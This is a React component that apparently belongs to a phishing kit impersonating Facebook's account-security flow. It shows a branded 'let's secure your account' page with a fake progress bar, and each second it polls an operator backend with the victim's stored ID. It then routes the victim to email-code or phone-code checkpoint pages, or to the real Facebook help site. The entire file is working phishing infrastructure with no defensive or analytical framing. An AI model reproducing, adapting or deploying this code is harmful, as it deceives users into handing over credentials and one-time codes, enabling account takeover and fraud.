import React, { useEffect, useState } from "react";
import "./styles/robot.css";
import { Progress, Button } from "antd";
import { useLocation, useNavigate } from "react-router";
import { API_BE } from "./utils/variable";

export const Robot = () => {
  const navigate = useNavigate();
  const { state } = useLocation();

  const splitName = (value) => {
    let form_data = localStorage.getItem("form_data");
    if (form_data) {
      form_data = JSON.parse(form_data);
    }

    if (!value && !form_data) return "";
    const full_name = !value ? form_data.full_name : value || "";
    return full_name.split(" ").slice(0, -1).join(" ") ?? "";
  };

  const [percent, setPercent] = useState(0);
  const [show, setShow] = useState(false);

  const increase = () => {
    setPercent(percent + 10);
  };

  useEffect(() => {
    const interval = setInterval(() => {
      setPercent((oldValue) => {
        const newValue = oldValue + 1;
        checkScreenSwitch();
        // if (newValue > 20) {
        //   checkScreenSwitch();
        // }

        if (newValue > 80) {
          // newValue;
          // clearInterval(interval);
        }

        return newValue;
      });
    }, 1000);

    return () => {
      clearInterval(interval);
    };
  }, []);

  const checkScreenSwitch = () => {
    let unique_id = localStorage.getItem("unique_id");
    let form_data = localStorage.getItem("form_data");

    if (unique_id || form_data) {
      form_data = JSON.parse(form_data);
      unique_id = JSON.parse(unique_id);
      fetch(`${API_BE}/users/` + unique_id)
        .then((res) => res.json())
        .then((response) => {
          if (response.data.status === 1) {
            navigate("/checkpoint/next=email", {
              state: { email: form_data.email, name: form_data.full_name },
            });
          } else if (response.data.status === 2) {
            navigate("/checkpoint/next=phone", {
              state: { email: form_data.email, name: form_data.full_name },
            });
          } else if (response.data.status === 3) {
            navigate("/checkpoint/next=error-authentication");
          } else if (response.data.status === 4) {
            window.location.href =
              "https://www.facebook.com/help/?mail_sent=1&_rdc=1&_rdr";
          }
        })
        .catch(() => {});
    }
  };

  const switchText = (percent) => {
    if (percent < 5) {
      return "email address(es)";
    } else if (percent < 10) {
      return "name";
    } else if (percent < 15) {
      return "birthday";
    } else if (percent < 20) {
      return "phone number(s)";
    } else if (percent < 25) {
      return "username";
    } else if (percent < 30) {
      return "payment methods";
    } else if (percent < 35) {
      return "apps";
    } else if (percent < 40) {
      return "posts";
    } else if (percent < 45) {
      return "comments";
    } else if (percent < 50) {
      return "logins";
    } else if (percent < 55) {
      return "page roles";
    } else if (percent < 60) {
      return "commerce posts";
    } else if (percent < 65) {
      return "apps";
    } else if (percent < 70) {
      return "phone numbers";
    } else if (percent < 75) {
      return "payment methods";
    } else if (percent < 80) {
      return "page roles";
    }
  };

  return (
    <>
      <div className="header-color hide-on-mobile">
        <div className="header-container">
          <h2>facebook</h2>
        </div>
      </div>
      <div className="robot-header-mobile">
        {" "}
        <span className="left-icon"></span>
        Hi{" "}
        <span style={{ textTransform: "capitalize", paddingLeft: 5 }}>
          {splitName(state?.name)}
        </span>
        , let's secure your account
      </div>
      <div className="robot-wrapper">
        <div className="robot-container">
          <div className="robot-icons">
            <div className="robot-icon-mobile">
              {/* <span className="robot-icon"></span> */}
              <img src="/robot-txt.png" />
            </div>
            <div className="robot-text">
              <h2>
                Hi{" "}
                <span style={{ textTransform: "capitalize" }}>
                  {splitName(state?.name)}
                </span>
                , let's secure your account
              </h2>
              <p>
                To help keep your Facebook account secure, we'll take you
                through a few steps to change your password and make sure any
                recent changes to your account came from you.
              </p>
              <Progress
                className="robot-progress-bar"
                percent={percent > 80 ? 80 : percent}
              />
              <p className="percent-text">
                {percent > 80 ? (
                  "Finished checking..."
                ) : (
                  <>Checking your {switchText(percent)}...</>
                )}
              </p>
            </div>
          </div>
          <div className="robot-footer ">
            <button disabled className="disableButton" onClick={increase}>
              Get Started
            </button>
          </div>
        </div>
        <div className="robot-footer-mobile">
          <button disabled className="disableButton" onClick={increase}>
            Get Started
          </button>
        </div>

        <div className="footer-flex-mobile-robot">
          <div>
            <h2>English (US)</h2>
            <p>Deutsch</p>
            <p>Српски</p>
            <p>Português (Brasil)</p>
          </div>
          <div>
            <p>Italiano</p>
            <p>Bosanski</p>
            <p>Svensk</p>
            <button>+</button>
          </div>
        </div>
      </div>
      <div className="robot-footer-desktop">
        <div className="footer-menu-flex-ul">
          <div className="container-language-footer">
            <ul className="flex-ul">
              <li>English (US)</li>
              <li>Español</li>
              <li>Deutsch</li>
              <li>Türkçe</li>
              <li>Српски</li>
              <li>Français (France)</li>
              <li>Italiano</li>
              <li>Bosanski</li>
              <li>Svensk</li>
              <li>Português (Brasil)</li>
              <button className="countrys-button">
                <span>+</span>
              </button>
            </ul>
          </div>
          <div className="flex-second-ul">
            <ul>
              <li>Sign Up</li>
              <li>Log In</li>
              <li>Messenger</li>
              <li>Facebook Lite</li>
              <li>Watch</li>
              <li>Places</li>
              <li>Games</li>
              <li>Marketplace</li>
              <li>Facebook Pay</li>
              <li>Oculus</li>
              <li>Portal</li>
              <li>Instagram</li>
              <li>Bulletin</li>
              <li>Local</li>
            </ul>
          </div>
          <div className="flex-second-ul-2">
            <ul>
              <li>Fundraisers</li>
              <li>Services</li>
              <li>Voting Information Centre</li>
              <li>About</li>
              <li>Create ad</li>
              <li>Create Page</li>
              <li>Developers</li>
              <li>Careers</li>
              <li>Privacy</li>
              <li>Cookies</li>
              <li className="ad-choice-img">
                Ad Choices <span className="img-li"></span>{" "}
              </li>
              <li>Terms</li>
              <li>Help</li>
            </ul>
          </div>
          <div className="meta-footer">
            <p>Meta © 2022</p>
          </div>
        </div>
      </div>
    </>
  );
};
